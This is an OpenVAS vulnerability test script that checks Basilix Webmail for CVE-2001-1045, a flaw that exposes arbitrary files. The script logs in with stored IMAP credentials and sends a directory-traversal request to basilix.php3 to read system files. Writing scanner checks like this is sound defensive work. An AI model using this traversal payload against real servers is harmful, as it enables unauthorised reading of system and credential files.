###############################################################################
# OpenVAS Vulnerability Test
# $Id: basilix_webmail.nasl 5625 2017-03-20 15:02:04Z cfi $
#
# Basilix Webmail Dummy Request Vulnerability
#
# Authors:
# Michel Arboi <arboi@alussinan.org>
#
# Copyright:
# Copyright (C) 2002 Michel Arboi
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2,
# as published by the Free Software Foundation
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

# References:
# From: "karol _" <su@poczta.arena.pl>
# To: bugtraq@securityfocus.com
# CC: arslanm@Bilkent.EDU.TR
# Date: Fri, 06 Jul 2001 21:04:55 +0200
# Subject: basilix bug

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.11072");
  script_version("$Revision: 5625 $");
  script_tag(name:"last_modification", value:"$Date: 2017-03-20 16:02:04 +0100 (Mon, 20 Mar 2017) $");
  script_tag(name:"creation_date", value:"2005-11-03 14:08:04 +0100 (Thu, 03 Nov 2005)");
  script_bugtraq_id(2995);
  script_tag(name:"cvss_base", value:"5.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:N/A:N");
  script_cve_id("CVE-2001-1045");
  script_name("Basilix Webmail Dummy Request Vulnerability");
  script_category(ACT_ATTACK);
  script_copyright("This script is Copyright (C) 2002 Michel Arboi");
  script_family("Web application abuses");
  script_dependencies("find_service.nasl", "http_version.nasl", "os_detection.nasl", "logins.nasl");
  script_require_ports("Services/www", 80);
  script_mandatory_keys("imap/login", "imap/password");
  script_exclude_keys("Settings/disable_cgi_scanning");

  script_xref(name:"URL", value:"http://archives.neohapsis.com/archives/bugtraq/2001-07/0114.html");

  script_tag(name:"solution", value:"Update Basilix or remove DUMMY from lang.inc.");

  script_tag(name:"summary", value:"The remote web server contains a PHP script that is prone to information
  disclosure. 

  Description :

  The script 'basilix.php3' is installed on the remote web server.  Some
  versions of this webmail software allow the users to read any file on
  the system with the permission of the webmail software, and execute any PHP.");

  script_tag(name:"solution_type", value:"Workaround");
  script_tag(name:"qod_type", value:"remote_app");

  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");

port = get_http_port( default:80 );
if( ! can_host_php( port:port ) ) exit( 0 );

user = get_kb_item( "imap/login" );
pass = get_kb_item( "imap/password" );
if( ! user || ! pass ) exit( 0 );

files = traversal_files();
foreach file( keys( files ) ) {

  url = "/basilix.php3?request_id[DUMMY]=../../../../../../../../../" + files[file]  + "&RequestID=DUMMY&username=" + user + "&password=" + pass;
  if( http_vuln_check( port:port, url:url, pattern:file  ) ) {
    report = report_vuln_url( port:port, url:url );
    security_message( port:port, data:report );
    exit( 0 );
  }
}

exit( 99 );